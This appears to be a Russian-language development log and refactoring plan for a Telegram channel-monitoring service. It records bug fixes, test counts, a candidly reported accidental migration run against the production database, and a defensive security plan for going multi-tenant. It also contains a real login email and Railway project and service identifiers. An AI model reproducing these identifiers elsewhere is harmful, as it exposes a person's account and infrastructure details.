инлайны разметки (#81), инлайны модулей и снятие `unsafe-inline` (#82). **Уборка красоты кончилась ужесточением политики безопасности:** `'unsafe-inline'` стоял ради инлайновых стилей, инлайнов не осталось ни одного — разрешение снято. **Собственная регрессия, найденная владельцем:** базовое правило кнопки, заскоупленное шагом 6 как `.auth-card button`, стало весить (0,1,1) и переиграло одиночный `.google-btn` — кнопка входа через Google оказалась нечитаемой на наведении; лечение — двусоставный селектор и своя кнопка со знаком Google, тест проверяет **вес**, а не цвет (#83). **Специфичность статически не доказуема** (правило по `id` весит 1,0,0 и сильнее удвоенного класса 0,2,0): до выкладки сняты отпечатки живого кабинета, после выкладки сверены — на четырёх вкладках 268 якорей по `id`, расхождений стиля ноль, всё различие — живые данные и наведение мыши. Прогон: **813 passed, 8 skipped** |
| Источник из одного канала отдавал сырой JSON | ✅ готово (поведенческие на конвейере + исправлена проверка, закреплявшая дефект) | 2026-09-15 | найдено владельцем: у «Finder.work» в ленте и в боте приходил JSON вместо оформленного сообщения, хотя заполнены оба промпта — у канала извлечение («верни ТОЛЬКО JSON, форматированием занимается другой промпт на следующем шаге»), у источника оформление в HTML. **Причина — оптимизация конвейера, а не промпт:** у источника один канал, и разбор со сведением уходили ОДНИМ запросом — промпты канала и источника склеивались через пустую строку. Модель получала два взаимоисключающих набора указаний и выполняла первый; обещанного «следующего шага» не существовало, и ответ единственного запроса становился ответом источника. **Склейка срабатывала РОВНО в сломанном случае:** условие `single and answer_prompt` — это и есть «есть чем оформлять, но оформлять негде»; без промпта оформления склеивать нечего, с ним — ломается контракт, на который написаны оба промпта. Сводить при одном канале нечего, а оформлять есть что: это разные шаги, и число каналов на второй не влияет. Проверка `test_112`, требовавшая один запрос при любом раскладе, **исправлена в тесте с объяснением** — посылка была верна наполовину. Цена лечения названа: источник из одного канала с промптом оформления стоит теперь два запроса вместо одного, второй идёт по выжимке, а не по постам (закреплено антивакуумом). Прогон: **818 passed, 8 skipped** |
| Флажок согласия растягивался во всю строку | ✅ готово (статическое разрешение каскада + решение владельца по тексту) | 2026-09-15 | найдено владельцем в окне подключения Telegram: галочка «Я понимаю объём доступа» нарисована рамкой во всю ширину блока. **Причина — правило, написанное для полей ввода:** `input, select, textarea { width: 100%; padding: …; border: … }` достаёт до любого `input`, а `input` — это и текст, и флажок. Остальные флажки кабинета спрятаны под переключателем (`.switch input { width: 0 }`) и потому уцелели; согласие 13.1 — единственный честный флажок в кабинете, и он остался один на один с геометрией текстового поля. Дефект родился вместе с 13.1 (2026-09-14), уборка дизайна ни при чём: инлайнового стиля у этого флажка не было никогда. Заведено правило для `checkbox`/`radio` — **выше** правила `.switch input`: вес у них одинаковый (0,1,1), а при равном весе побеждает последний по файлу, и переключатель обязан остаться за собой. Сузить само правило полей (`input:not([type=…])`) было бы короче, но подняло бы его вес до (0,2,1), и оно начало бы выигрывать у классов, которые сегодня его переопределяют. `test_143` разрешает каскад статически: у одинокого `<input type="checkbox">` смотрится, какое правило побеждает по весу и порядку. **Текст предупреждения сокращён решением владельца:** абзац про серую зону правил Telegram убран целиком. `test_133` требовал слова «ограничить» и после удаления остался ЗЕЛЁНЫМ по другой строке — «ограничить доступ только нужными каналами нельзя» говорит об ОБЪЁМЕ доступа, а не о риске для аккаунта: слово совпало, смысл разошёлся. Ложный зелёный найден глазами, а не прогоном; проверка переписана на то, что осталось — риск для аккаунта назван только в строке согласия и больше нигде не объяснён. Прогон: **824 passed, 8 skipped** |
| Контролы формы источника разной высоты | ✅ готово (статическое разрешение каскада + замер в браузере) | 2026-09-15 | найдено владельцем в окне источника: список интервала выше поля названия (36,5px против 34,5px), кнопки «Из диалогов» и «+ Добавить» ниже поля рядом с ними (25px против 34,5px), у списка «кривая стрелочка». **Причина у первого — нативный контрол:** правило `input, select, textarea` одно на всех, отступы и шрифт совпадают, но `select` считает свою внутреннюю геометрию сам, и наши отступы её не выравнивают; заодно он рисует свою стрелку мимо дизайн-системы. Снято `appearance: none`, стрелка собрана двумя градиентами из токена `--mute`: картинкой её не нарисовать, не зашив цвет внутрь data-URI, а переменная CSS туда не проникает — это был бы возврат литералов, убранных шагами 2 и 2b. **Причина у второго — размер класса:** `btn-sm` стоял в строке с полем полного размера; заведён `.btn-field` — те же отступы и тот же размер текста, что у поля, значит и та же высота, **без magic number**. Правило стоит ниже `.btn-sm`: вес одинаковый (0,1,0), при равном весе решает порядок. Проверка считает не высоту, а то, из чего она складывается (вертикальные отступы, размер текста, рамка) — браузера в CI нет; сама высота замерена движком: все четыре контрола 34,5px. **Промпт оформления объясняет себя:** пояснение добавлено в оба места (создание и редактирование) и говорит, КОГДА промпт работает и что будет, если поле пустое — разница настоящая, именно она давала JSON вместо сообщения. Прогон: **831 passed, 8 skipped** |
| Сведение не укладывалось в потолок | ✅ готово (поведенческие на батче + вывод потолка из окна устаревания) | 2026-09-15 | найдено владельцем через час после лечения склейки: снова JSON в боте, но уже от источника из ВОСЬМИ каналов, где склейки быть не могло. Формат назвал причину сам («канал: вердикт» через пустую строку — это запасной путь), журнал прода подтвердил дословно: `StepTimeout: тайм-аут 120 с: сведение по каналам`. **Причина — один потолок на два разных шага.** `LLM_TIMEOUT = 120 с` писался под разбор канала: тот читает посты и отвечает данными. Сведение ПИШЕТ итоговое сообщение, и его длина растёт с числом находок: у источника набралось около двадцати вакансий, генерация не уложилась. Заведён `REDUCE_TIMEOUT`, и он **выводится из окна устаревания воркера** (`WORKER_STALE_AFTER - 10`), а не назначается на глаз: отметка о жизни ставится между единицами работы, поэтому вызов длиннее окна сделал бы работающего воркера мёртвым на вид и заставил бы тревогу 13.3 соврать о простое. **Отказ оформления теперь сначала повторяется:** вердикты каналов уже сохранены в задаче, повтор переспрашивает ТОЛЬКО оформление — отдавать сырые вердикты с первой попытки значило заплатить за разбор и выбросить оформление из-за одной медленной генерации. Исчерпанный месячный бюджет — исключение: повтор упрётся в тот же потолок, находки уходят сразу. **Запасной путь теперь называет себя:** сообщение начинается строкой «Оформление не удалось — ниже находки в сыром виде», и строку пишет система (модель её и не увидит — оформление как раз не состоялось). Молчаливая подмена оформленного ответа сырым отправляла искать ошибку в промпте, которого она не касается. Прогон: **838 passed, 8 skipped** |
| Ограждение модели уезжало в сообщение | ✅ готово (воспроизведено на живой записи + разбор границы правила) | 2026-09-15 | найдено владельцем: из «VASILE LUNGO» пришло сообщение, начинающееся с ```html и заканчивающееся ```. Доказано по проду: в `feed_items.ai_analysis` лежит ровно это, а внутри — правильные `<b>` и `<a>`; обёртку добавила модель, промпт её не просил. **`to_telegram_html` ограждения не снимал и в `<pre>` не превращал:** текст сначала режется по настоящим тегам, и разбор ограждений идёт уже внутри кусков — открывающее попадает в один кусок, закрывающее в другой, пара не находится никогда. Чинится не промптом: модуль в первых строках сам говорит «промпт — не гарантия, формат ответа — обязанность доставки». **Границу правила задал старый `test_105`:** ответ из одного python-блока обязан остаться кодом, и он прав — поэтому снимается только обёртка с пустым или разметочным языком (`html`, `json`, `markdown`), а имя настоящего языка оставляет ответ кодом. Заодно закрыт молчащий путь доставки: у бота три пути (`sendRichMessage` → `sendMessage` c `parse_mode=HTML` → `sendMessage` без него), и последний отправлял сообщение буквами **без единой записи** — «пришло без форматирования» нельзя было узнать иначе как глазами. Теперь это событие `TG_BOT_PLAIN` со статусом ERROR. Прогон: **848 passed, 8 skipped** |
| 13.15 Отказ почты молчал и выдавал аккаунт | ✅ готово (настройки прода сверены без чтения секретов + поведенческие на эндпоинте) | 2026-09-24 | владелец: «почему не работает отправка письма? Я же подключал рассылщик по API». Режим production доказан флагом `Secure` у живой cookie, `RESEND_API_KEY` задан и формата `re_…`, **`MAIL_FROM` не задан** — работает умолчание `onboarding@resend.dev`, тестовый отправитель Resend: по документации такие письма уходят только владельцу аккаунта Resend, остальным 403. **`APP_BASE_URL` указывает на старый адрес**, который теперь 404, — даже доставленное письмо вело в никуда. Обе настройки чинит владелец. **Дефекты в коде:** (1) ни принятое письмо, ни отказ не оставляли в журнале ни строки — запрос сброса 22 сентября вернул 200, и по логам нельзя было отличить «ушло», «отклонено» и «адреса нет»; (2) отказ Resend поднимался наверх как 500, а случается он только для СУЩЕСТВУЮЩЕГО адреса — то есть тот самый перечислитель, от которого эндпоинт защищался одинаковым ответом (`test_24` не видел: он в режиме разработки, где письмо не может отказать). Теперь каждый исход — строка в журнале (id письма или причина словами Resend с подсказкой про `MAIL_FROM`), адрес замаскирован, токена нет; ответ одинаков при любом исходе. Контракт `test_28` сохранён: транспорт по-прежнему падает громко — меняется только, КОМУ громко. Прогон: **915 passed, 8 skipped** |
| 13.14 Отказ входа через Google не называл причину | ✅ готово (причина проверена публичным вызовом Firebase + статические тесты на тело функции) | 2026-09-24 | найдено владельцем: после переезда на `asmadey.vercel.app` вход через Google перестал работать. **Причина снаружи кода:** вход идёт через Firebase `signInWithPopup`, а у Firebase свой список Authorized domains. Тот же публичный вызов, которым SDK сверяет домен, вернул `localhost`, `mtproto-ai.firebaseapp.com`, `mtproto-ai.web.app`, `telegram-monitor-n8n-bridge.vercel.app` — старый адрес есть, нового нет; SDK отвечает `auth/unauthorized-domain` ещё до открытия окна. Чинит владелец в консоли Firebase. **Дефект внутри кода:** `catch` отличал только закрытое окно, всё остальное становилось одной фразой, в консоль не писалось ничего — неразрешённый домен, заблокированное окно и обрыв сети выглядели одинаково. Теперь код причины уходит в консоль всегда, а две причины, которые чинит человек или оператор, получают свои слова; сообщение о домене называет адрес. Прогон: **909 passed, 8 skipped** |
| 13.13 Пост из бота ронял весь канал | ✅ готово (воспроизведено на живом отказе прода + правило шире поля) | 2026-09-17 | найдено владельцем: источник «ТОП-вакансии» прислал тревогу «не дал ни одной находки. getmatch: бот с IT-вакансиями — причина в журнале». В журнале: `NotNullViolationError: null value in column "forwards" of relation "sent_messages"`. **Причина — `dict.get` с умолчанием там, где приходит `None`:** у поста БРОАДКАСТ-канала счётчик пересылок число, у поста из диалога с ботом (`t.me/g_jobbot/…`) его не существует вовсе, и Telethon отдаёт КЛЮЧ СО ЗНАЧЕНИЕМ `None`. Умолчание `get` срабатывает только на отсутствие ключа — ключ был. **Цена — весь канал за прогон:** посты вставляются одним многострочным `INSERT`, одна плохая строка отменяет вставку целиком; в журнале два одинаковых отказа на одном сообщении с разницей в шесть часов. Тревога 13.3 при этом сработала верно. Защита поставлена шире одного поля: тест берёт колонки `NOT NULL` ИЗ МОДЕЛИ, поэтому новая колонка попадёт под проверку сама. `views` намеренно остаётся пустым — «не знаем» честнее выдуманного нуля. Прогон: **904 passed, 8 skipped** |
| 13.12 Теги из документации приезжали буквами | ✅ готово (воспроизведено на формате из промпта владельца) | 2026-09-16 | владелец предложил чинить формат промптом и показал свой рабочий промпт для n8n: ответ строится блоками `sendRichMessage` (`<h1>`, `<p>`, `<blockquote>`, `<table>` с `<thead>`/`<tbody>`, `<hr>`), `<br>` запрещён. Для нашего сервиса промпт форматом не занимается — это правило записано в первых строках `telegram_markup`, — **но пример вскрыл настоящий дефект**: список известных тегов был уже документации Bot API, а неизвестный тег у нас ЭКРАНИРУЕТСЯ (намеренно: пусть автор видит, что модель написала не то, чем текст молча исчезнет). Итог: человек, написавший промпт ПО ДОКУМЕНТАЦИИ TELEGRAM, получал в сообщении буквальные `<p>` и `</p>`. Добавлены `p`, `hr`, `thead`, `tbody`; запасной путь их разворачивает (абзац — пустой строкой). **Улика лежала в коде с 9.19:** `rich_html_to_plain` разворачивал `thead` и `tbody`, которых фильтр до него не пропускал никогда. Прогон: **900 passed, 8 skipped** |
| 13.11 Молчание модели стоило каналу постов | ✅ готово (правило повтора без базы + поведенческие на батче) | 2026-09-16 | найдено владельцем: «не удалось разобрать сообщения из источника „Job for Products and Projects“». Журнал: `StepTimeout: тайм-аут 120 с: разбор канала`, сутками раньше то же на «Finder.work» — разные источники и каналы, то есть обычная медлительность провайдера, а не больной канал. **Асимметрия:** сбой провайдера (`RuntimeError`) возвращал батч в очередь и повторялся до трёх раз, а тайм-аут — подкласс `TimeoutError` — мимо этой ветки уходил в общий `except`, где повтора нет вовсе. **Цена — не оформление, а посты:** комментарий в самом воркере говорит, что посты уже зарезервированы дедупликацией и пометить канал неразобранным значит потерять их навсегда. То же правило задача #88 уже закрепила на шаге СВЕДЕНИЯ — здесь оно распространено на РАЗБОР. Правило вынесено в `_recoverable` и проверяется без базы: бюджет и отсутствие ключа не повторяются (это про весь источник), испорченный ответ тоже (повтор его не вылечит). Прогон: **893 passed, 8 skipped** |
| 13.10 Перенос строки в богатом сообщении | ✅ готово (воспроизведено на живой записи `#77` + сверено с документацией Bot API) | 2026-09-16 | найдено владельцем: сводка из восьми вакансий пришла в бота **одной сплошной строкой**. В `feed_items.ai_analysis` при этом лежит нормальный текст с 44 переводами строк, и `to_telegram_html` их сохранял — значит, дело не в промпте и не в модели, как предполагал владелец. **Причина — метод доставки.** С 9.19 сводка уходит через `sendRichMessage`, а его поле `html` разбирается как НАСТОЯЩИЙ HTML: документация в разделе «Rich HTML style» заканчивает список строчных тегов строкой-примером «all the text above was on the same line». Перевод строки там — обычный пробел, перенос делают `<br>` и блочные теги. Дефект тихий и старый: с 2026-09-09 каждая сводка приходила стеной, а таблицы 9.19 чинили ровно эту боль и починили — у таблицы структура блочная. **Правка двусторонняя:** `to_telegram_html` расставляет `<br>`, а `rich_html_to_plain` разворачивает их обратно в `\n` — в наборе тегов `sendMessage` `<br>` нет вовсе, и одна правка без другой уронила бы запасной путь в 400. Внутри `<pre>` перенос делает сам пробел, между блочными тегами перевод строки — отступ исходника (иначе список приедет с пустой строкой после каждого пункта). **`test_105` исправлен в тесте:** он требовал обратного приведения (`<br>` → `\n`) и был прав при `sendMessage` — сменилась сторона, а не смысл. Заодно нарезка длинной сводки снова режет по концу строки: её опора `\n` в богатом сообщении исчезла. Прогон: **885 passed, 8 skipped** |
| 13.9 Сборка находок кодом | ✅ готово (схема Pydantic + структурный вывод + поведенческие на конвейере; ревизия `0019`) | 2026-09-15 | предложение владельца: раз каждый канал и так отвечает JSON, пусть итог собирает КОД, а не вторая модель. Повод — два отказа за день с одним симптомом (JSON вместо сообщения) и разными причинами: склейка промптов (#85) и тайм-аут сведения (#88); общий корень — итог СОЧИНЯЕТ модель. **Схема — один объект Pydantic на три применения:** провайдеру в `response_format` (строгий режим плюс `require_parameters`, иначе OpenRouter уводит запрос к провайдеру, который параметр игнорирует), себе для валидации ответа, промпту канала — текстом контракта, сгенерированным из той же схемы. Разойтись они не могут, потому что источник один. **Строгость и терпимость — разные стороны одного контракта:** провайдеру уходит `additionalProperties: false`, а наша валидация `extra="ignore"` — модель дописывает свои поля, и чужое поле не повод выбросить находку; первая версия теста требовала строгости от НАШЕЙ схемы и была исправлена в тесте. Корень схемы — объект, а не массив (строгий режим массив верхним уровнем не принимает); все поля обязательные и строковые, пустая строка = «не указано» (необязательное поле даёт `anyOf` с `null`, который половина провайдеров не разбирает). **Запасной ход обязателен:** не всякая модель умеет `json_schema`, и отказ ИМЕННО про `response_format` повторяется без него ровно один раз — смена модели в настройках иначе молча убила бы все источники; нехватка денег и лимиты остаются отказами. Сборка делает только склейку, дедуп (по ссылке, затем по названию и компании; при дубле остаётся более полная запись) и порядок каналов — решение владельца. Режим у источника (`assembly_mode`), умолчание прежнее. Находки легли в ленту КОЛОНКОЙ (`findings_json`) и уходят в n8n массивом: до сих пор в БД лежал отрисованный текст, и поэтому кабинет не мог рисовать карточки, а переотрисовка требовала модели. **Сторож `test_122` поймал расхождение** — интерфейс читал поле, которого нет в списке контракта; поле внесено в реестр с причиной. Прогон: **875 passed, 8 skipped**. **Подтверждено живым прогоном 2026-09-16 07:19–07:20 UTC:** «Finder.work» в режиме `template` дал запись ленты с `findings` массивом объектов и готовым HTML вместо JSON, `TG_BOT_SENT SUCCESS`; событий `AI_OFF_SCHEMA` (запасной ход) и `TG_BOT_PLAIN` нет — провайдер принял схему, сообщение ушло с разметкой; второго вызова модели не было. Осталось видимым другое: `StepTimeout: тайм-аут 120 с: разбор канала` — `LLM_TIMEOUT` на шаге РАЗБОРА, 13.9 его не касается |
| Счётчик до следующего прогона пропал с карточки | ✅ готово (исполнение расчёта в node + свип осиротевших стилей) | 2026-09-14 | найдено владельцем. Из двух индикаторов один был на месте («Прогон: 17:37» — время последнего), но в одиночку читался двусмысленно — подписан явно. Второй исчез **в три приёма, все три в коммите 11.7**: из разметки ушёл сегмент «След: …»; из `main.js` ушёл вызов `refreshMonitorTimers()`, а **`setInterval` остался** — и с 10 сентября четырежды в минуту исполнял пустое тело под комментарием, обещающим пересчёт; осиротевший `formatNextRun` затем убрал свип мёртвого кода 12.3 — по своему правилу верно, отличить «убрано намеренно» от «потеряно при переезде» он не умеет. **Пережили переезд только правила CSS** (`.timeline-next-status`, `.pulse-dot`) — это и есть отпечаток потери: **стиль пережил разметку**, третий носитель того же класса после «текст пережил код» (12.1, 12.4, 12.5, 13.4). Заведён свип: правило без разметки — ошибка, если не названо в `KNOWN_ORPHANS` с причиной. Свип сразу назвал ещё две потери того же коммита: чип «Отправлено: N • ID X» (сервер до сих пор считает `sent_count` для никого) и чип «LLM Промпт»; возвращать ли их — решение владельца. Пересчёт трогает только текст счётчика, а не весь список: кнопка «Запустить» гаснет на время запроса, и перерисовка раз в 15 секунд вернула бы её в строй посреди него. **Красная фаза:** 11 failed. Прогон: **738 passed, 7 skipped** |
| Карточка ленты не помнила источник | ✅ готово (поведенческие на настоящем конвейере + ревизия `0017`) | 2026-09-14 | найдено владельцем: в ленте у свежих записей буква вместо логотипа канала, у старых картинка на месте. Задача 11.9 закрывала ровно это и закрыла **половину дороги**: `/api/feed` считает `avatar_chat_id` по `monitor_id` карточки, `feed.js` его читает, а **писал `monitor_id` никто**. Колонку завела ревизия `0012` и один раз заполнила у исторических строк — оттуда и карточки с аватаркой; конвейер источника (11.4) кладёт `chat_id: None`, а источник не называет. **Почему не увидели тесты:** все они сеют `FeedItem(..., monitor_id=source.id)` руками — проверялось чтение поля, которое тест сам же и записал. Поэтому в `test_137` карточка не создаётся руками ни разу: лента смотрится после настоящего прогона `poll_source`. **Второй пострадавший, найденный красной фазой:** `_batch_from_feed` берёт промпты по `item.monitor_id` — пусто → переразбор идёт **пустым** промптом извлечения и пустым промптом оформления (красный тест показал `''`). Аватарка была видимой половиной дефекта, эта — дорогой. **Третье, по дороге:** тот же `_batch_from_feed` читал источник `db.get(Monitor, ...)` без фильтра по владельцу — переведено на `TenantRepo`. Ревизия `0017` возвращает связь строкам, уже лежащим в базе, — по имени и **только при однозначном совпадении** в кабинете: неверный `monitor_id` показал бы чужой канал и разобрал бы карточку чужими промптами, а отличить это от правильной работы уже нельзя. **Красная фаза:** 4 failed. Прогон: **729 passed, 8 skipped** |
| Канал по числовому id не разрешался | ✅ готово (поведенческий на двойнике шлюза) | 2026-09-14 | найдено владельцем: источник «VASILE LUNGO | INSIDER» не дал ни одной находки, хотя в канале были свежие публикации. В тревоге канал назван голым числом — это и был диагноз: имя берётся как `chat_title or chat_target`, а `chat_title` появляется только после УСПЕШНОГО разрешения. **Две причины, и по отдельности ни одна не лечится.** Первая: id хранится строкой и строкой уезжает в Telethon, а `get_entity("-100…")` разбирает строку как имя пользователя или телефон — до канала не доходит вовсе. Функция `clean_target`, написанная ровно для этого, **не вызывалась ниоткуда** — мертва с переезда 11.8, и свип 12.3 её не видел: он ходит только по `static/js`. Вторая: по голому id канал не разрешить без `access_hash` — Telethon пробует `GetChannelsRequest` с нулём и для приватного канала получает `ChannelInvalidError`, а кэш сущностей живёт в сессии, и **`StringSession` его не сохраняет**: после каждого перезапуска воркера он пуст. Лечение: числовую строку пробуем числом (работает для строк, которые уже лежат в базе — миграции не нужно), а при неудаче прогреваем кэш списком диалогов и пробуем ещё раз. Здоровый канал за прогрев не платит — закреплено антивакуумным тестом. Попутно: `clean_target` **калечила пригласительные ссылки** (`t.me/+AbCdEf` → `AbCdEf`), то есть единственный способ добавить приватный канал; пока функция была мертва, это никому не мешало. Тревога теперь **называет причину**, а не отсылает в журнал: смысл тревоги в том, чтобы узнать об отказе, не заходя в кабинет. **Ошибка в тесте, исправлена в тесте:** первая версия требовала, чтобы API сохранял приведённый адрес, — это ломало контракт `test_114` (в списке человек видит то, что набрал) и ничего не давало: Telethon одинаково понимает `@alpha`, `alpha` и полную ссылку. Прогон: **725 passed, 7 skipped** |
| Дубль канала роняет источник | ✅ готово (нормализация + защита прогона + читаемая запись) | 2026-09-13 | найдено владельцем на источнике «ТОП-вакансии»: прогон падал целиком с `IntegrityError` на ключе `(monitor_id, chat_id)`. **Ограничение сработало верно — в нём и был замысел; неверно было всё остальное.** Канал добавляется ссылкой, `chat_id` появляется только при первом опросе, а проверка на повтор сравнивала `chat_target` БУКВАЛЬНО: `@forproducts`, `t.me/forproducts`, `https://t.me/forproducts/` — три строки и три «разных» канала, которые Telethon разрешает в один чат. Ограничение стреляло не при добавлении, а при ЗАПИСИ разрешённого `chat_id`, то есть на прогоне, и исключение уносило **весь источник** — включая каналы, которые разобрались; опрос повторялся по расписанию и падал снова. Лечение с трёх сторон, и ни одной по отдельности не хватает: (1) на входе повтор ловится по нормализованному адресу (`app/services/channels.py`, схема/хост/`@`/регистр/ссылка на пост; приглашения и `c/<id>` не трогаются — хеш регистрозависим); (2) на прогоне столкновение перестало быть исключением — канал объявляется неразобранным с внятной причиной и именем двойника, остальные разбираются как обычно (нормализация этого не заменяет: публичное имя и приглашение в тот же чат сходятся законно, узнать можно только после разрешения); (3) `_reason` обрезает хвост SQLAlchemy — владелец видел четыре строки SQL с подстановками вместо причины, а параметры это ещё и содержимое строк таблицы в журнале. **Попутно повторён и пойман факт 4 `CLAUDE.md`:** первая версия делала `rollback()` перед чтением поля двойника и падала `MissingGreenlet`; отката там не нужно вовсе — столкновение ловится ДО присваивания. **Красная фаза:** 11, затем 1 failed на `assert`. Прогон: **670 passed, 7 skipped** |
| Четыре находки владельца | ✅ готово (статический + поведенческий) | 2026-09-10 | **Форма нового источника была раскрыта всегда:** переименование 11.7 «Каналы» → «Источники» доехало до разметки и модуля, но не до таблицы стилей — правило осталось на `#addChannelDrawer`, `display:none` перестало находить свой элемент. `test_118` держит стык с двух сторон: id, которому JS переключает класс показа, обязан иметь правило, а правило не смеет ссылаться на несуществующий id. **Карточка источника в ленте рисовала букву вместо аватарки:** конвейер пишет `chat_id: None` (у источника каналов много), а фронтенд строит картинку как `/api/avatars/{chat_id}`. Сами аватарки на месте — `poll_source` их складывает; потеряна была дорога. Добавлено `avatar_chat_id` — первый канал источника по `position`, одним запросом на страницу (`test_119`, включая защиту от N+1 и от подтягивания чужого канала). **Docker подтверждён живой сборкой:** демон подняли через colima, `docker build` прошёл, поиск по всему образу секретов не нашёл — но нашёл 77 МБ `.mypy_cache`, которых список шаблонов увидеть не мог; образ 501 → 429 МБ. **В `CLAUDE.md` записано:** слияние PR делает агент, а не оператор |
| Разворачивание дерева в корень | ✅ готово (статический свип) | 2026-09-10 | репозиторий переехал из подкаталога `Teleton/FastAPI/` в корень — на GitHub корень и так был плоским, `FastAPI/` было именем локальной папки. Освобождено 975 МБ (четыре worktree, шаблон `Ruby/`, дубли). **Перенос вскрыл три дефекта, которых не поймал ни один тест, потому что все были верны для прежней раскладки:** `private-backups/` лежал ЭТАЖОМ ВЫШЕ и в контекст Docker не попадал, а после разворачивания оказался внутри `COPY . .` вместе со снимком сессии и боевой базой; две проверки `test_03` сторожили каталог выше репозитория и молча ушли в вечный skip (571 passed → 569 passed, 9 skipped) — переписаны на корень и теперь работают в CI; `Ruby/` не был чистым клоном (уникальный `STACK-COMPARISON.md` и 108 строк правок README) — спасён перед удалением по уроку задачи 0.5. Живые указатели `FastAPI/...` в `PLAN_REFINEMENT.md` и `docs/PLAN.md` вели в пустоту — исправлены, возврат закрыт свипом `test_117`. Журнал (`PROGRESS.md` и строки-записи этой таблицы) намеренно не правился. **Не подтверждено:** `docker build` — демон не запущен |

Прогон 2026-09-01 (вечер): `pytest -q` → **10 passed**. Из Фазы 0 остались только 0.2 (оператор)
и поведенческие проверки (docker build, живой браузер, живой сервер).

Прогон 2026-09-01 (ночь, Фаза 1): `pytest -q` без test_10/11/12 (пакеты ещё не установлены)
→ **13 passed, 3 skipped**. `test_10_deps.py`, `test_11_config.py`, `test_12_models.py`
красные — пакеты не установлены (Bash-классификатор недоступен: read-only команды проходят,
pip/git — нет). Повторить `pip install -r requirements-dev.txt` при восстановлении.

Прогон 2026-09-02 (утро, Фаза 1): `pip install` прошёл через `.venv/bin/python -m pip`
(у `.venv/bin/pip` был сломан shebang — venv создан до переезда проекта, пересоздан целиком).
`pytest -q` → **49 passed, 3 skipped** (skip — поведенческие части 1.4–1.5 без живого PG).

**Урок 2026-09-02 (инцидент с боевой базой).** Смоук-тест alembic: `DATABASE_URL` был задан
инлайном для CLI-команды и НЕ экспортировался в следующий python-процесс; env.py взял дефолт
`sqlite+aiosqlite:///./storage.db` из `app.config` и молча побежал миграции по **боевой** базе —
создал 4 пустые таблицы + `alembic_version` (упал на `monitors`, данные не пострадали; таблицы
удалены, целостность проверена: 5 каналов / 192 сообщения / 308 логов / 8 ленты / 1 интеграция).
Выводы, закреплённые тестами (`98813fd`): alembic берёт `DATABASE_URL` ТОЛЬКО из `os.environ`
и отказывается работать без него; `Settings.database_url` не имеет дефолта — misconfiguration
падает громко, а не masquerade как успех. Дефолт «рабочей» базы в конфиге — мина, не удобство.

Гит: репозиторий проекта — `FastAPI/.git` (история с Фазы 0, коммит параллельной сессии `d00a04e`).
Задачи 1.1–1.5 закоммичены каждая отдельно: `349c6b7`, `5fe8d08`, `091197e`, `ba5df1d`, `cfc6779`,
плюс `1079f0f` (журнал PROGRESS.md). Секреты в индексе не замечены (`git ls-files` чист).
В корне `Teleton/` остался ПУСТОЙ `.git` от ошибочного `git init` (ни коммитов, ни индекса) — удалить.

Инфраструктура Railway (2026-09-01): CLI v5.34.2 (логин sagestaf@gmail.com), создан проект
**Teleton** `9eef378a-33ca-4041-a3fb-b16c06aa080b` (окружение production
`e9f28019-adce-4ae8-a88e-d0db57e192ef`), каталог репозитория слинкован
(на ту дату — подкаталог `Teleton/FastAPI/`, с 2026-09-10 — корень; привязка переезд пережила). Добавлен сервис
**Postgres** `4ca9beff-d765-4951-b979-cb7d4d07077b` — SUCCESS, без публичных доменов и без
public TCP-proxy (только приватная сеть; переменная для приложений — `${{Postgres.DATABASE_URL}}`).
Само приложение НЕ деплоится до задачи 2.3: эндпоинты без аутентификации (К2).

---

## 0. Что происходит и зачем

`server.py` — 1994 строки, написанные быстро и работающие. Это персональный локальный
инструмент: мониторинг Telegram-каналов через Telethon (MTProto, от лица живого аккаунта),
дедупликация постов, анализ через OpenRouter LLM, доставка в n8n-вебхук и в Telegram-бота.
Фронтенд — один файл `static/index.html` на 3975 строк ванильного JS.

**Задача — превратить его в мульти-тенант SaaS, который можно выставить в публичный интернет.**

Стек не меняется: остаёмся на FastAPI + Telethon. Причина — в Ruby нет зрелой библиотеки MTProto,
а переписывать рабочий код ради смены языка бессмысленно. Из Rails-шаблона `Ruby/` переносим
**устройство сервисных модулей** (аутентификация, сессии в БД, сброс пароля, админка), а не код.

**Почему безопасность здесь не гигиена, а суть задачи.** В мульти-тенанте каждый пользователь
подключает свой Telegram-аккаунт, и на сервере оседает его MTProto-сессия. Такая сессия — не пароль:
её нельзя сбросить удалённо, и она даёт полное чтение переписки. База с сессиями сотни
пользователей — это возможность угнать сто живых аккаунтов одним запросом. Всё, что описано ниже
про шифрование, изоляцию и закрытые по умолчанию эндпоинты, следует из этого одного факта.

**Деплой — Railway.** Там managed Postgres, несколько сервисов в одном проекте и приватная сеть.
Modal.com не подходит: он про serverless-батчи, а MTProto держит долгоживущее TCP-соединение.
Trigger.dev — оркестратор задач для TypeScript, не хостинг.

### Что сломано прямо сейчас (полный список — в разделе 9)

Три вещи делают текущий деплой небезопасным немедленно:

1. `.dockerignore` не исключает `.env`, `*.session`, `storage.db`, `key.md`, а `Dockerfile`
   делает `COPY . .`. В образ запекается живой auth-key Telegram-аккаунта и база с ключами.
2. Аутентификации нет вообще — ни одного `Depends`, ни одного middleware. Все ~40 эндпоинтов
   открыты, включая `GET /dialogs` (весь список чатов аккаунта).
3. `GET /api/openrouter` и `GET /api/telegram-forward` рядом с маской отдают сырой ключ и токен.

---

## 1. Как работать: цикл CDD

**CDD = Contract-Driven Development.** Каждая задача начинается с падающего теста, который
описывает контракт, и заканчивается зелёным тестом. Порядок не декоративный.

```
1. Красный тест   → tests/test_NN_<имя>.py, запустить, УБЕДИТЬСЯ ЧТО ПАДАЕТ
2. Реализация     → минимальный код до зелёного
3. Проверка       → pytest -q && ruff check . && mypy app/
4. Коммит         → одна задача = один коммит
```

**Тест, написанный после реализации, проверяет то, что вы сделали, а не то, что требовалось.**
Это не формальность: половина задач ниже — про безопасность, и там разница между «код работает»
и «код делает ровно то, что заявлено» — это и есть уязвимость.

**Красный тест обязан падать по правильной причине.** Тест, падающий с `ImportError`, потому что
модуля ещё нет, — не красный тест, а отсутствующий. Сначала создайте пустой модуль с заглушкой,
убедитесь, что тест падает на `assert`, и только потом пишите реализацию.

**Два уровня тестов.** Статический работает где угодно: разбирает исходники, конфиги, схему.
Поведенческий требует живого Postgres. Поведенческий при отсутствии среды обязан честно писать
`pytest.skip`, а не выдумывать результат.

### Команды

```bash
pytest -q                          # все тесты
pytest tests/test_12_auth.py -q    # один файл
ruff check . && ruff format --check .
mypy app/
bandit -r app/ -ll                 # поиск небезопасных паттернов
pip-audit                          # уязвимости в зависимостях
alembic upgrade head               # применить миграции
```

---

## 2. Целевая структура файлов

Сейчас всё лежит в одном `server.py`. К концу работ должно быть так
